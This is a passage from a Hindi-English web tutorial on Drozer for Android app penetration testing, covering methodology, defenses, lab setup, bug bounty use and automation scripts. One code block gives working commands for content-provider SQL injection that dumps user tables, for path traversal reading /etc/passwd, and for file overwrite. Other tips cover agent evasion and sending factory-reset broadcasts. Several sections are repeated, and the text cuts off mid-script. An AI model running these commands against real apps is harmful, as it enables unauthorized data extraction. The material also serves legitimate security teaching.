        <strong className="text-white">Phase 1 — Reconnaissance:</strong> पहले app को समझो। APK download करो, manifest analyze करो, permissions list करो। MobSF से static analysis करो। Drozer से app.package.info run करो — permissions, version, debug status सब देखो। App की functionality समझो — क्या करता है, कैसे करता है।
      </p>
      <p>
        <strong className="text-white">Phase 2 — Attack Surface Mapping:</strong> app.package.attacksurface से exported components count करो। हर exported component एक potential attack vector है। Activities, Services, Receivers, Providers — सब list करो। जितना बड़ा attack surface, उतना ज़्यादा vulnerability का chance।
      </p>
      <p>
        <strong className="text-white">Phase 3 — Vulnerability Testing:</strong> हर exported component को individually test करो। Content Providers में SQL injection, path traversal try करो। Activities में unauthorized access test करो। Broadcast Receivers में malicious intents भेजो। Services में data injection try करो।
      </p>
      <p>
        <strong className="text-white">Phase 4 — Exploitation:</strong> मिली vulnerabilities exploit करो। Data extract करो, unauthorized actions perform करो, privilege escalation try करो। Impact demonstrate करो — client को दिखाओ कि vulnerability कितनी dangerous है।
      </p>
      <p>
        <strong className="text-white">Phase 5 — Reporting:</strong> सभी findings document करो। हर finding के लिए: description, severity, reproduction steps, impact, और recommendation। Screenshots और Drozer output attach करो। Executive summary और technical details दोनों include करो।
      </p>

      <h2>Detection and Defense</h2>
      <p>
        Drozer के अटैक्स से बचने के लिए डेवलपर्स को यह करना चाहिए:
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Defense</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">Implementation</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">exported=false</td><td className="py-2 px-3">कंपोनेंट्स को external access से रोकता है</td><td className="py-2 px-3 font-mono text-xs">android:exported="false"</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Permission Guard</td><td className="py-2 px-3">Content Provider पर permission लगाता है</td><td className="py-2 px-3 font-mono text-xs">android:permission="custom.perm"</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Signature Permission</td><td className="py-2 px-3">सिर्फ same-signature apps access कर सकते हैं</td><td className="py-2 px-3 font-mono text-xs">protectionLevel="signature"</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Parameterized Queries</td><td className="py-2 px-3">SQL injection रोकता है</td><td className="py-2 px-3 font-mono text-xs">selectionArgs use करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Path Validation</td><td className="py-2 px-3">पाथ ट्रैवर्सल रोकता है</td><td className="py-2 px-3 font-mono text-xs">Uri.normalize(), canonicalPath</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">debuggable=false</td><td className="py-2 px-3">Production में debugging disable</td><td className="py-2 px-3 font-mono text-xs">android:debuggable="false"</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">ProGuard/R8</td><td className="py-2 px-3">कोड obfuscation — reverse engineering मुश्किल</td><td className="py-2 px-3 font-mono text-xs">minifyEnabled true</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Input Validation</td><td className="py-2 px-3">सभी IPC input validate करें</td><td className="py-2 px-3 font-mono text-xs">whitelist, regex</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Broadcast Permission</td><td className="py-2 px-3">Protected broadcasts use करें</td><td className="py-2 px-3 font-mono text-xs">android:permission</td></tr>
            <tr><td className="py-2 px-3 text-white">Runtime Checks</td><td className="py-2 px-3">Drozer agent detect करें</td><td className="py-2 px-3 font-mono text-xs">PackageManager check</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Drozer for Bug Bounty</h2>
      <p>
        Bug bounty programs में Drozer बहुत useful है। Android apps के bug bounty में exported components, unprotected content providers, और IPC vulnerabilities commonly reported issues हैं। Drozer से यह सब quickly test कर सकते हो।
      </p>
      <p>
        Bug bounty में Drozer use करते समय scope ध्यान से पढ़ो। कुछ programs IPC testing allow नहीं करते। Out-of-scope components test मत करो। Drozer का output screenshots के साथ report में attach करो — severity, impact, और reproduction steps clearly लिखो।
      </p>
      <p>
        Common bug bounty findings Drozer से: exported activities (admin panels, debug screens), unprotected content providers (user data leak), SQL injection in content providers, path traversal in file providers, unsecured broadcast receivers (command injection), और debuggable apps। यह सब high/critical severity findings हैं।
      </p>
      <p>
        Bug bounty hunters Drozer + Frida + MobSF combination use करते हैं। MobSF static analysis, Drozer IPC testing, और Frida runtime hooking — तीनों मिलकर comprehensive coverage देते हैं। Automated scripts बनाओ जो हर new APK पर same tests run करें — time बचेगा। Drozer output JSON format में save करो — CI/CD pipeline में integrate कर सकते हो।
      </p>

      <h2>Drozer Limitations</h2>
      <p>
        Drozer powerful है लेकिन इसकी limitations भी हैं। यह जानना ज़रूरी है कि Drozer क्या नहीं कर सकता।
      </p>
      <p>
        Drozer सिर्फ IPC-level testing करता है — runtime hooking, memory analysis, और network interception नहीं कर सकता। इसके लिए Frida या Objection use करो। Drozer को Android emulator पर कभी-कभी connectivity issues आती हैं — USB debugging enable रखो। नए Android versions (13, 14) में कुछ Drozer modules properly काम नहीं करते — latest release use करो।
      </p>
      <p>
        Drozer agent APK detectable है — production apps के testing में यह limitation है। App-level security (root detection, tampering detection) Drozer agent को block कर सकती है। ऐसे cases में Frida better है क्योंकि वह runtime पर inject होता है। Drozer Python 3.10+ में compatibility issues हैं — virtual environment use करो।
      </p>
      <p>
        Drozer WiFi connection unstable हो सकती है — large data transfers में connection drop हो सकता है। USB connection reliable है लेकिन single device limit है। Multiple devices simultaneously test करने के लिए multiple console instances + different ports use करो। Drozer community modules quality vary करती है — trust but verify। हमेशा latest stable version use करो — older versions में known bugs हैं।
      </p>

      <h2>Lab Environment Setup</h2>
      <p>
        Drozer सीखने के लिए सेफ लैब बनाना ज़रूरी है। एमुलेटर या rooted device use करो।
      </p>
      <CodeBlock
        title="लैब सेटअप"
        code={`# एमुलेटर सेटअप (Genymotion या Android Studio):
# Genymotion — फ्री पर्सनल यूज़
# Android Studio AVD — गूगल का एमुलेटर

# टेस्ट एप्स डाउनलोड करें:
# DIVA (Damn Insecure and Vulnerable App):
git clone https://github.com/payatu/diva-android

# InsecureBankv2:
git clone https://github.com/dineshshetty/Android-InsecureBankv2

# Drozer टेस्ट एप:
# drozer-practice.apk — drozer के साथ आता है

# MSTG Crackmes (OWASP):
# https://github.com/OWASP/MASTG-Hacking-Playground

# डिवाइस सेटअप:
# 1. Developer Options → USB Debugging ON
# 2. adb devices (कनेक्टेड दिखना चाहिए)
# 3. drozer agent APK इंस्टॉल करें
# 4. एजेंट खोलें → Embedded Server → Start
# 5. adb forward tcp:31415 tcp:31415
# 6. drozer console connect

# ग्रेडुअली हार्ड चैलेंजेज़:
# 1. DIVA — सबसे आसान, beginners के लिए
# 2. InsecureBankv2 — intermediate
# 3. Real-world APKs — advanced
# 4. Bug bounty targets — expert`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="एडवांस्ड Drozer"
        code={`# फ़ज़िंग — कंटेंट प्रोवाइडर फ़ज़िंग:
dz> run app.provider.fuzz content://com.target.app.provider/users

# डिबगेबल एप्स ढूंढें:
dz> run scanner.misc.finddebuggable

# एक्सपोर्टेड रिसीवर्स:
dz> run scanner.broadcast.receiver -a com.target.app

# डेटा थेफ़्ट — फ़ाइल एक्सफ़िल्ट्रेशन:
dz> run app.provider.read content://com.target.app.provider/databases/users.db

# मैनिफ़ेस्ट एनालिसिस:
dz> run app.package.manifest com.target.app | grep -i "exported"

# Drozer + Frida combo:
# Drozer से exported components find करो
# Frida से runtime hook करो
# दोनों complementary हैं

# ऑटोमेटेड ऑडिट:
# Python script से सभी tests run करो
# Output JSON में save करो
# CI/CD pipeline में integrate करो

# कस्टम scanner module:
dz> run scanner.misc.nativeibraries -a com.target.app
dz> run scanner.misc.readablefiles -a com.target.app
dz> run scanner.misc.secretcodes -a com.target.app`}
      />
      <CodeBlock
        title="ऑटोमेटेड ऑडिट स्क्रिप्ट"
        code={`# Python drozer automation script:
import subprocess
import json

def drozer_cmd(cmd):
    full_cmd = f'echo "{cmd}" | drozer console connect'
    result = subprocess.run(full_cmd, shell=True,
                          capture_output=True, text=True)
    return result.stdout.strip()

package = "com.target.app"
report = {
    "package": package,
    "attack_surface": drozer_cmd(f"run app.package.attacksurface {package}"),
    "activities": drozer_cmd(f"run app.activity.info -a {package}"),
    "providers": drozer_cmd(f"run app.provider.info -a {package}"),
    "services": drozer_cmd(f"run app.service.info -a {package}"),
    "receivers": drozer_cmd(f"run app.broadcast.info -a {package}"),
    "uris": drozer_cmd(f"run scanner.provider.finduris -a {package}"),
    "sqli": drozer_cmd(f"run scanner.provider.injection -a {package}"),
    "traversal": drozer_cmd(f"run scanner.provider.traversal -a {package}"),
    "debuggable": drozer_cmd(f"run app.package.debuggable {package}"),
    "native_libs": drozer_cmd(f"run scanner.misc.nativeibraries -a {package}")
}

with open("drozer_report.json", "w") as f:
    json.dump(report, f, indent=2)

print("[+] Report saved: drozer_report.json")
print(f"[+] Attack surface: {report['attack_surface']}")`}
      />
      <CodeBlock
        title="कंटेंट प्रोवाइडर एक्सप्लॉइटेशन"
        code={`# स्टेप 1: URIs खोजो
dz> run scanner.provider.finduris -a com.target.app

# स्टेप 2: SQL Injection test
dz> run app.provider.query content://com.target.app.provider/users \\
  --projection "* FROM sqlite_master--"
# Tables list हो जाएंगी

# स्टेप 3: Data extract करो
dz> run app.provider.query content://com.target.app.provider/users \\
  --projection "* FROM users--"
# सभी user data मिलेगा

# स्टेप 4: Path Traversal test
dz> run scanner.provider.traversal -a com.target.app
# ../../../etc/passwd try करो

# स्टेप 5: File read
dz> run app.provider.read content://com.target.app.provider/files/../../../etc/passwd

# स्टेप 6: File write test
dz> run app.provider.update content://com.target.app.provider/files/ \\
  --selection "test" --selection-args "test" \\
  --column data --value "hacked"`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या Drozer फ्री है?', a: 'हाँ, पूरी तरह फ्री और ओपन सोर्स (BSD लाइसेंस)। WithSecure ने बनाया है और मेंटेन करता है। Commercial use भी free।' },
          { q: 'क्या रूटेड डिवाइस चाहिए?', a: 'नहीं, Drozer बिना रूट के भी काम करता है। एजेंट APK नॉर्मल तरीके से इंस्टॉल होता है। लेकिन कुछ एडवांस्ड फ़ीचर्स (जैसे backup extraction) के लिए रूट चाहिए।' },
          { q: 'Android 14 पर काम करता है?', a: 'हाँ, लेटेस्ट वर्जन Android 14 तक सपोर्ट करता है। GitHub से लेटेस्ट APK डाउनलोड करो — पुराने versions में compatibility issues हो सकते हैं।' },
          { q: 'WiFi से कनेक्ट कर सकते हैं?', a: 'हाँ, adb tcpip 5555 करो फिर adb connect <device_ip>:5555। लेकिन USB ज़्यादा स्टेबल और fast है। WiFi connection unstable हो सकता है।' },
          { q: 'Frida के साथ यूज़ कर सकते हैं?', a: 'हाँ! Drozer IPC टेस्टिंग के लिए, Frida रनटाइम हुकिंग के लिए। दोनों कॉम्प्लिमेंटरी हैं — Drozer exported components find करता है, Frida runtime behavior modify करता है।' },
          { q: 'कस्टम मॉड्यूल कैसे बनाएं?', a: 'Python में लिखो ~/.drozer_modules/ directory में save करो। Module class inherit करो drozer module से। dz> run custom.module_name से run करो।' },
          { q: 'Multiple devices connect कर सकते हैं?', a: 'हाँ, अलग-अलग ports पर forward करो: adb -s device1 forward tcp:31415 tcp:31415 और adb -s device2 forward tcp:31416 tcp:31415। Different console instances use करो।' },
          { q: 'क्या iOS पर काम करता है?', a: 'नहीं, Drozer सिर्फ Android के लिए है। iOS testing के लिए Objection, Frida, और idb जैसे tools use करो।' },
          { q: 'Drozer detect हो सकता है?', a: 'हाँ, Drozer agent APK detectable है। App-level security (root detection, tampering checks) agent को block कर सकती है। Stealth testing के लिए Frida better है।' },
          { q: 'Content Provider URI कैसे खोजें?', a: 'scanner.provider.finduris module सबसे useful है। app.package.manifest से भी URIs मिल सकते हैं। APK decompile करके AndroidManifest.xml check करो।' },
          { q: 'Bug bounty में कैसे use करें?', a: 'पहले scope पढ़ो। exported components test करो — activities, providers, services, receivers। SQL injection और path traversal try करो। Screenshots + reproduction steps के साथ report करो।' },
          { q: 'Drozer crash हो रहा है?', a: 'Python version check करो (3.8-3.9 best)। Virtual environment use करो। protobuf package reinstall करो। drozer console connect --debug से error details देखो।' },
          { q: 'Emulator vs Real device — कौन बेहतर?', a: 'Emulator testing के लिए अच्छा है — snapshots, easy reset। Real device final validation के लिए ज़रूरी है — hardware-specific behaviors emulator में miss हो सकते हैं।' },
          { q: 'Drozer + Frida together कैसे use करें?', a: 'Drozer exported components find करता है, Frida runtime behavior modify करता है। पहले Drozer से attack surface map करो, फिर Frida से specific functions hook करो। दोनों complementary हैं।' },
          { q: 'Android 14 restrictions?', a: 'Android 14 में target SDK 33+ restrictions हैं — exported components को explicitly declare करना पड़ता है। कुछ Drozer modules properly काम नहीं करते। Latest Drozer release use करो।' },
          { q: 'Drozer agent hide कैसे करें?', a: 'Production apps agent detect कर सकते हैं। Objection ya Frida better stealth options हैं। Drozer agent का package name change करके repack करो — basic evasion।' },
          { q: 'Emulator detection bypass?', a: 'कुछ apps emulator detect करते हैं। Genymotion better option है — hardware identifiers change कर सकते हो। Real device use करो accurate testing के लिए।' },
          { q: 'Custom modules कैसे share करें?', a: '~/.drozer_modules/ directory में Python files save करो। Git repo बनाकर team के साथ share करो। dz> module index.create से index rebuild करो।' },
          { q: 'SSL pinning bypass Drozer से?', a: 'Drozer directly SSL pinning bypass नहीं करता। इसके लिए Frida ya Objection use करो। Drozer exported components find करता है, Frida runtime behavior modify करता है।' },
          { q: 'Drozer CI/CD में integrate कैसे करें?', a: 'Python wrapper script बनाओ जो Drozer commands run करे। JSON output save करो। Jenkins/GitHub Actions में integrate करो। Automated security regression testing possible है।' },
          { q: 'Multiple APKs simultaneously test?', a: 'Different console instances use करो — हर APK के लिए अलग console। Different ports पर forward करो: adb forward tcp:31415 tcp:31415 (agent 1), adb forward tcp:31416 tcp:31415 (agent 2)' },
          { q: 'Drozer vs AppMon?', a: 'AppMon GUI-based Frida wrapper है — real-time monitoring। Drozer IPC testing focused है। AppMon API calls track करता है, Drozer exported components test करता है। दोनों complementary हैं।' },
          { q: 'Native libraries test कैसे करें?', a: 'dz> run scanner.misc.nativeibraries -a com.target.app से native libraries list करो। .so files extract करके Ghidra/IDA में analyze करो। JNI interface test करो।' },
          { q: 'Deep link vulnerabilities?', a: 'dz> run app.activity.info -a com.target.app से exported activities देखो। Deep link handlers find करो। Custom scheme URLs test करो: app://, myapp://। URL injection try करो।' },
          { q: 'Webview vulnerabilities test कैसे करें?', a: 'dz> run app.activity.info -a com.target.app में Webview activities find करो। JavaScript interface, file access, SSL errors — सब test करो। setJavaScriptEnabled(true) + addJavascriptInterface() dangerous combination है।' },
          { q: 'Intent redirection vulnerabilities?', a: 'Exported activities में incoming intents forward करना dangerous है। attacker-controlled intent से internal components access हो सकते हैं। dz> run app.activity.start --component com.target.app com.target.app.ExportActivity --extra string target com.target.app.InternalActivity' },
          { q: 'Drozer output format options?', a: 'Default text output readable है लेकिन automated processing के लिए JSON better है। Python wrapper script बनाओ जो commands run करे और JSON में parse करे। CSV export भी possible है।' },
          { q: 'SQLite database access?', a: 'dz> run app.provider.query content://com.target.app.provider/database --projection "* FROM sqlite_master--" से tables list करो। SQL injection से पूरा database extract कर सकते हो।' },
          { q: 'File path traversal test?', a: 'dz> run scanner.provider.traversal -a com.target.app से path traversal check करो। ../../../etc/passwd, ../../../data/data/com.target.app/databases/ — try करो। FileProvider properly configured है verify करो।' },
          { q: 'Drozer + ADB combination?', a: 'ADB backup analysis करो: adb backup -f backup.ab com.target.app। Drozer से exported components test करो। ADB shell से file system explore करो। दोनों complementary tools हैं — ADB system-level, Drozer app-level।' },
          { q: 'Content Provider permissions test?', a: 'dz> run app.provider.info -a com.target.app से read/write permissions check करो। null permission = unprotected! readPermission और writePermission properly set है verify करो।' },
          { q: 'Drozer scripts automate कैसे करें?', a: 'drozer console connect -c "run app.package.attacksurface com.target.app" से single command run करो। Bash script बनाओ जो multiple commands chain करे। Python drozer API भी available है advanced automation के लिए।' },
          { q: 'App comparison testing?', a: 'Competitor apps को same methodology से test करो। Security posture compare करो — exported components count, protection mechanisms, vulnerability patterns। Benchmark report बनाओ।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Real-World Case Studies</h2>
      <p>
        Drozer का इस्तेमाल रियल-वर्ल्ड Android सिक्योरिटी ऑडिट्स में बहुत होता है। यह केस स्टडीज़ दिखाती हैं कि कैसे Drozer ने critical वल्नरेबिलिटीज़ खोजीं।
      </p>
      <p>
        <strong className="text-white">केस 1 — बैंकिंग एप ऑडिट:</strong> एक बैंकिंग एप के पेनेट्रेशन टेस्ट में Drozer ने 5 exported activities खोजीं जिनमें से एक admin panel activity थी। इस activity को directly launch करने से बिना authentication के admin settings access हो रही थी। Drozer का app.package.attacksurface module इसे तुरंत पकड़ लिया।
      </p>
      <p>
        <strong className="text-white">केस 2 — सोशल मीडिया एप:</strong> एक सोशल मीडिया एप में Drozer ने unprotected Content Provider खोजा जो user database expose कर रहा था। SQL injection test से पूरा user table extract हो गया — emails, phone numbers, hashed passwords सब। scanner.provider.injection module ने यह vulnerability automatically detect की।
      </p>
      <p>
        <strong className="text-white">केस 3 — IoT एप सिक्योरिटी:</strong> एक स्मार्ट होम एप में Drozer ने exported broadcast receiver खोजा जो factory reset command accept कर रहा था। कोई भी malicious app यह broadcast भेजकर सभी connected devices reset कर सकता था। यह critical severity finding थी जो Drozer के बिना miss हो जाती।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        Drozer अकेले comprehensive Android testing के लिए काफ़ी नहीं है। इसे दूसरे tools के साथ combine करो।
      </p>
      <CodeBlock
        title="Drozer + Frida + MobSF कॉम्बो"
        code={`# वर्कफ़्लो:
# 1. MobSF → स्टैटिक एनालिसिस (APK decompile)
# 2. Drozer → IPC टेस्टिंग (exported components)
# 3. Frida → रनटाइम हुकिंग (behavior modify)

# Step 1: MobSF से APK स्कैन करो
# http://localhost:8000 पर APK अपलोड करो
# Exported components, permissions, code analysis

# Step 2: Drozer से exported components टेस्ट करो
drozer console connect
dz> run app.package.attacksurface com.target.app
dz> run scanner.provider.finduris -a com.target.app
dz> run scanner.provider.injection -a com.target.app

# Step 3: Frida से runtime hook करो
# SSL pinning bypass:
frida -U -f com.target.app -l ssl_bypass.js

# API monitoring:
frida -U -f com.target.app -l api_monitor.js

# Root detection bypass:
frida -U -f com.target.app -l root_bypass.js

# Drozer + Burp Suite:
# Burp में proxy setup → एप का traffic capture
# Drozer से exported activities test
# Burp में API endpoints analyze

# Drozer + APKTool:
# APKTool से decompile → smali code analyze
# Drozer से component testing
# Smali patches apply करो`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        Android पेनेट्रेशन टेस्ट के बाद detailed report बनाना ज़रूरी है। Drozer के आउटपुट को structured format में save करो।
      </p>
      <CodeBlock
        title="रिपोर्ट जनरेशन"
        code={`# Drozer output फ़ाइल में सेव करो:
drozer console connect << 'EOF' > audit_report.txt
run app.package.attacksurface com.target.app
run app.activity.info -a com.target.app
run app.provider.info -a com.target.app
run app.service.info -a com.target.app
run app.broadcast.info -a com.target.app
run scanner.provider.finduris -a com.target.app
run scanner.provider.injection -a com.target.app
run scanner.provider.traversal -a com.target.app
run app.package.debuggable -a com.target.app
EOF

# JSON रिपोर्ट बनाओ:
cat > generate_report.py << 'PYEOF'
import json
import subprocess

def run_dz(cmd):
    r = subprocess.run(f'echo "{cmd}" | drozer console connect',
                      shell=True, capture_output=True, text=True)
    return r.stdout.strip()

pkg = "com.target.app"
report = {
    "package": pkg,
    "attack_surface": run_dz(f"run app.package.attacksurface {pkg}"),
    "activities": run_dz(f"run app.activity.info -a {pkg}"),
    "providers": run_dz(f"run app.provider.info -a {pkg}"),
    "services": run_dz(f"run app.service.info -a {pkg}"),
    "receivers": run_dz(f"run app.broadcast.info -a {pkg}"),
    "uris": run_dz(f"run scanner.provider.finduris -a {pkg}"),
    "sqli": run_dz(f"run scanner.provider.injection -a {pkg}"),
    "traversal": run_dz(f"run scanner.provider.traversal -a {pkg}")
}

with open("audit_report.json", "w") as f:
    json.dump(report, f, indent=2)
print("[+] Report saved: audit_report.json")
PYEOF`}
      />

      <h2>Performance Tuning</h2>
      <p>
        Drozer की performance optimize करने के लिए कुछ tips:
      </p>
      <CodeBlock
        title="परफ़ॉर्मेंस टिप्स"
        code={`# USB कनेक्शन use करो (WiFi से तेज़):
adb forward tcp:31415 tcp:31415
drozer console connect

# एक समय में एक मॉड्यूल रन करो:
# कई मॉड्यूल्स एक साथ रन करने से slow होता है

# Module index rebuild (अगर slow है):
dz> module index.create

# ADB connection optimize:
adb kill-server
adb start-server
adb devices

# बड़े एप्स के लिए specific module use करो:
# पूरा scan न करो, targeted testing करो
dz> run app.package.attacksurface com.target.app
# फिर सिर्फ exported components test करो

# WiFi vs USB performance:
# USB: ~50ms per command
# WiFi: ~200-500ms per command
# USB 4-10x faster है

# Drozer server restart (अगर hang हो):
# डिवाइस पर: Drozer Agent → Stop → Start
# फिर: adb forward tcp:31415 tcp:31415`}
      />

      <h2>Drozer for Bug Bounty</h2>
      <p>
        Bug bounty programs में Drozer बहुत useful है। Android apps के bug bounty में exported components, unprotected content providers, और IPC vulnerabilities commonly reported issues हैं। Drozer से यह सब quickly test कर सकते हो।
      </p>
      <p>
        Bug bounty में Drozer use करते समय scope ध्यान से पढ़ो। कुछ programs IPC testing allow नहीं करते। Out-of-scope components test मत करो। Drozer का output screenshots के साथ report में attach करो — severity, impact, और reproduction steps clearly लिखो।
      </p>
      <p>
        Common bug bounty findings Drozer से: exported activities (admin panels, debug screens), unprotected content providers (user data leak), SQL injection in content providers, path traversal in file providers, unsecured broadcast receivers (command injection), और debuggable apps। यह सब high/critical severity findings हैं।
      </p>

      <h2>Drozer Limitations</h2>
      <p>
        Drozer powerful है लेकिन इसकी limitations भी हैं। यह जानना ज़रूरी है कि Drozer क्या नहीं कर सकता।
      </p>
      <p>
        Drozer सिर्फ IPC-level testing करता है — runtime hooking, memory analysis, और network interception नहीं कर सकता। इसके लिए Frida या Objection use करो। Drozer को Android emulator पर कभी-कभी connectivity issues आती हैं — USB debugging enable रखो। नए Android versions (13, 14) में कुछ Drozer modules properly काम नहीं करते — latest release use करो।
      </p>
      <p>
        Drozer agent APK detectable है — production apps के testing में यह limitation है। App-level security (root detection, tampering detection) Drozer agent को block कर सकती है। ऐसे cases में Frida better है क्योंकि वह runtime पर inject होता है। Drozer Python 3.10+ में compatibility issues हैं — virtual environment use करो।
      </p>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Frida</td><td className="py-2 px-3">रनटाइम हुकिंग</td><td className="py-2 px-3">JavaScript से रनटाइम मॉडिफिकेशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Objection</td><td className="py-2 px-3">Frida-बेस्ड टूलकिट</td><td className="py-2 px-3">Easy-to-use CLI, Frida wrapper</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">MobSF</td><td className="py-2 px-3">मोबाइल सिक्योरिटी फ्रेमवर्क</td><td className="py-2 px-3">स्टैटिक + डायनामिक एनालिसिस, Web UI</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">QARK</td><td className="py-2 px-3">Quick Android Review Kit</td><td className="py-2 px-3">सोर्स कोड रिव्यू, स्टैटिक एनालिसिस</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">APKTool</td><td className="py-2 px-3">APK डिकंपाइलर</td><td className="py-2 px-3">APK रिवर्स इंजीनियरिंग, smali editing</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">jadx</td><td className="py-2 px-3">Java decompiler</td><td className="py-2 px-3">APK से Java source code</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">AppMon</td><td className="py-2 px-3">App monitoring</td><td className="py-2 px-3">GUI interface, Frida-based</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">APKiD</td><td className="py-2 px-3">APK identification</td><td className="py-2 px-3">Packers, protectors detect करता है</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>Drozer से पहले हमेशा app.package.attacksurface रन करो — यह बताता है कि कितने कंपोनेंट्स एक्सपोर्टेड हैं</li>
          <li>हर एक्सपोर्टेड कंपोनेंट को अलग से टेस्ट करो — priority Content Providers और Activities को दो</li>
          <li>Drozer + Frida + MobSF = कंप्लीट Android पेनेट्रेशन टेस्टिंग — Drozer IPC, Frida रनटाइम, MobSF स्टैटिक</li>
          <li>scanner.provider.finduris सबसे useful module है — hidden URIs ढूंढता है जो normal enumeration में miss हो जाते हैं</li>
          <li>Custom Python modules बनाओ repetitive tasks के लिए — time बचता है</li>
          <li>WiFi connection unstable हो सकता है — USB use करो critical testing के लिए</li>
          <li>Bug bounty में exported Content Providers सबसे ज़्यादा valuable findings देते हैं — SQL injection, path traversal, data leak</li>
          <li>Drozer + Frida + MobSF = complete Android pentest toolkit — IPC testing, runtime hooking, static analysis</li>
          <li>scanner.provider.finduris module hidden URIs ढूंढता है जो normal enumeration में miss हो जाते हैं</li>
          <li>Custom Python modules बनाओ repetitive tasks के लिए — हर audit में same tests run होते हैं</li>
          <li>Android 13+ में exported components को explicitly declare करना पड़ता है — newer apps में कम exported components मिलेंगे</li>
          <li>Drozer agent APK production apps detect कर सकते हैं — root/tampering detection bypass करना पड़ेगा</li>
          <li>Content Provider SQL injection सबसे common vulnerability है — हर app में check करो</li>
          <li>Broadcast receiver testing में sensitive actions try करो — factory reset, data wipe, password change</li>
          <li>Drozer output JSON format में save करो — CI/CD pipeline में integrate कर सकते हो</li>
          <li>WiFi connection से multiple devices simultaneously test कर सकते हो — USB से सिर्फ एक</li>
          <li>DIVA app से practice करो — सभी common Android vulnerabilities cover होती हैं</li>
          <li>Drozer module index rebuild करो अगर new modules add किए हैं: dz&gt; module index.create</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Drozer एक शक्तिशाली Android सिक्योरिटी टेस्टिंग फ्रेमवर्क है। इसका इस्तेमाल केवल अधिकृत पेनेट्रेशन टेस्टिंग और शैक्षिक उद्देश्यों के लिए करें। बिना अनुमति के एप्लिकेशन एनालिसिस करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत एप मॉडिफिकेशन और डेटा एक्सेस अपराध हो सकता है।
      </div>
      <h2>Drozer for Automated Security Testing</h2>
      <p>
        Drozer को automated security testing pipelines में integrate करके repetitive manual testing eliminate कर सकते हो। CI/CD pipelines, scheduled scans, और regression testing सब Drozer से automate हो सकते हैं। Automated testing consistent results देता है और human error कम होता है।
      </p>
      <CodeBlock
        title="Automated Testing Pipeline"
        code={`#!/bin/bash
# drozer_auto_test.sh — Automated Android security testing

PACKAGE=$1
RESULTS_DIR="drozer_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS_DIR"

echo "[+] Starting automated audit for: $PACKAGE"

# Module 1: Attack Surface
echo "[*] Running attack surface analysis..."
echo "run app.package.attacksurface $PACKAGE" | drozer console connect > "$RESULTS_DIR/attacksurface.txt" 2>&1

# Module 2: Content Provider SQL Injection
echo "[*] Testing SQL injection..."
echo "run scanner.provider.injection -a $PACKAGE" | drozer console connect > "$RESULTS_DIR/sqli.txt" 2>&1

# Module 3: Path Traversal
echo "[*] Testing path traversal..."
echo "run scanner.provider.traversal -a $PACKAGE" | drozer console connect > "$RESULTS_DIR/traversal.txt" 2>&1

# Module 4: Accessible URIs
echo "[*] Finding accessible URIs..."
echo "run scanner.provider.finduris -a $PACKAGE" | drozer console connect > "$RESULTS_DIR/uris.txt" 2>&1

# Module 5: Debuggable Check
echo "[*] Checking debuggable flag..."
echo "run app.package.debuggable -a $PACKAGE" | drozer console connect > "$RESULTS_DIR/debuggable.txt" 2>&1

# Module 6: Backup Check
echo "[*] Checking backup allowed..."
echo "run app.package.backup -f /tmp/backup.ab $PACKAGE" | drozer console connect > "$RESULTS_DIR/backup.txt" 2>&1

# Generate Report
echo "========================================" > "$RESULTS_DIR/report.txt"
echo "Drozer Security Audit Report" >> "$RESULTS_DIR/report.txt"
echo "Package: $PACKAGE" >> "$RESULTS_DIR/report.txt"
echo "Date: $(date)" >> "$RESULTS_DIR/report.txt"
echo "========================================" >> "$RESULTS_DIR/report.txt"

# Count findings
SQLI_COUNT=$(grep -c "Injection" "$RESULTS_DIR/sqli.txt" 2>/dev/null || echo "0")
TRAVERSAL_COUNT=$(grep -c "Traversal" "$RESULTS_DIR/traversal.txt" 2>/dev/null || echo "0")

